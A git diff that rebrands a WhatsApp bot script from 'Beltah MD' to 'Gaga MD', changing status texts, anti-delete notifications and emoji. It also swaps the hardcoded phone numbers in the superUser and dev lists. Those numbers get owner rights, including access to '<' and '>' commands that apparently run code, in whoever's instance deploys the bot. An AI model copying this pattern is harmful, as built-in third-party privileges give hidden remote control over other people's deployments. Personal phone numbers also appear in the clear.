@@ -209,7 +209,7 @@ if (conf.AUTOBIO === 'yes') {
     setInterval(() => {
       const date = new Date();
       zk.updateProfileStatus(
-        `🥷 GAGA MD 🥷 is active: ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
+        `🥷ɢᴀɢᴀ ᴍᴅ ʙᴏᴛ ɪs ᴀᴄᴛɪᴠᴇ 🥷: ${date.toLocaleString('en-US', { timeZone: 'Africa/Nairobi' })} It's a ${date.toLocaleString('en-US', { weekday: 'long', timeZone: 'Africa/Nairobi' })}.`
       );
     }, 10 * 1000);
   }
@@ -258,9 +258,9 @@ zk.ev.on("messages.upsert", async (m) => {
    // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*『 👻 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 👻 』*\n\n`;
+  let notification = `*ɢᴀɢᴀ ᴍᴅ ᴀɴᴛɪᴅᴇʟᴇᴛᴇ sʏsᴛ*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ᴍᴇssᴀɢᴇ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ ɢᴀɢᴀ ᴍᴅ`;
   return notification;
 }
 
@@ -373,9 +373,9 @@ zk.ev.on("messages.upsert", async m => {
       // Function to format notification message
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
-  let notification = `*『👻 ᴀɴᴛɪᴅᴇʟᴇᴛᴇ ᴅᴇᴛᴇᴄᴛᴇᴅ 👻』*\n\n`;
+  let notification = `*ɢᴀɢᴀ ᴍᴅ ᴀɴᴛɪᴅᴇʟᴇᴛᴇ sʏsᴛᴇᴍ*\n\n`;
   notification += `*ᴅᴇʟᴇᴛɪᴏɴ ᴛɪᴍᴇ :* ${new Date().toLocaleString()}\n`;
-  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ᴍᴇssᴀɢᴇ ʀᴇᴛʀɪᴇᴠᴇᴅ ʙʏ ʙᴇʟᴛᴀʜ-ᴍᴅ`;
+  notification += `*ᴅᴇʟᴇᴛᴇᴅ ʙʏ :* @${deletedBy.split('@')[0]}\n\n> ɢᴇɴᴇʀᴀᴛᴇᴅ ʙʏ ɢᴀɢᴀ ᴍᴅ`;
   return notification;
 }
 
@@ -534,7 +534,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
                         await zk.sendMessage(message.key.remoteJid, {
                             react: {
                                 key: message.key,
-                                text: "👻",
+                                text: "🥷",
                             },
                         }, {
                             statusJidList: [message.key.participant, adams],
@@ -659,10 +659,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "254737681758", '254114141192', '254737681758', "254114141192", '254737681758', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254112291443", '254729269118', '', "", '', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254114141192', '254737681758', "254737681758", '254737130240'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254729269118', '254112291443', "254112291443", ''].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -670,7 +670,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
           quoted: ms
         });
       }
-      console.log("\t [][]...{Beltah-Md}...[][]");
+      console.log("\t [][]...{Gaga-Md}...[][]");
       console.log("=========== New message ===========");
       if (verifGroupe) {
         console.log("message sent from : " + nomGroupe);
@@ -766,7 +766,7 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       
       if (! superUser && origineMessage === auteurMessage && conf.AUTO_BLOCK === 'yes') {
         zk.sendMessage(auteurMessage, {
-          'text': "🚫am blocking you because you have violated Beltah policies🚫!"
+          'text': "🚫am blocking you because you have violated Gaga md policies🚫!"
         });
         await zk.updateBlockStatus(auteurMessage, 'block');
       }
@@ -828,7 +828,7 @@ zk.ev.on("messages.upsert", async (m) => {
 
       if (texte && texte.startsWith('<')) {
   if (!superUser) {
-    return repondre("Only for my owner or Beltah Tech to execute this command 🚫");
+    return repondre("Only for my owner or Gaga to execute this command 🚫");
   }
   
   try { 
@@ -845,16 +845,16 @@ zk.ev.on("messages.upsert", async (m) => {
 if (texte && texte.startsWith('>')) {
   // If the sender is not the owner
   if (!superUser) {
-    const menuText = `This command is only for the owner or Beltah to execute 🚫`;
+    const menuText = `This command is only for the owner or Gaga to execute 🚫`;
 
     await zk.sendMessage(origineMessage, {
       text: menuText,
       contextInfo: {
         externalAdReply: {
-          title: "𝐁𝐄𝐋𝐓𝐀𝐇 𝐌𝐃" ,
-          body: "POWERED BY BELTAH HACKING TEAM",
+          title: "ᴋᴇᴇᴘ ᴜsɪɴɢ ɢᴀɢᴀ ᴍᴅ" ,
+          body: "ʀᴇɢᴀʀᴅs ᴛᴏ ʀɪᴄʜ-ɢᴀɢᴀ-ᴍɪᴅᴜsʜ",
           sourceUrl: conf.GURL,
-          thumbnailUrl: "https://telegra.ph/file/dcce2ddee6cc7597c859a.jpg" || conf.BOT_MENU_LINK,
+          thumbnailUrl: "" || conf.BOT_MENU_LINK,
           mediaType: 1,
           showAdAttribution: true,
           renderLargerThumbnail: false
@@ -888,7 +888,7 @@ if (texte && texte.startsWith('>')) {
   
   await zk.sendMessage(user, { 
     text: text,
-    react: { text: '⚔️', key: ms.key }
+    react: { text: '🥷', key: ms.key }
   }, { quoted: ms });
                        }
 
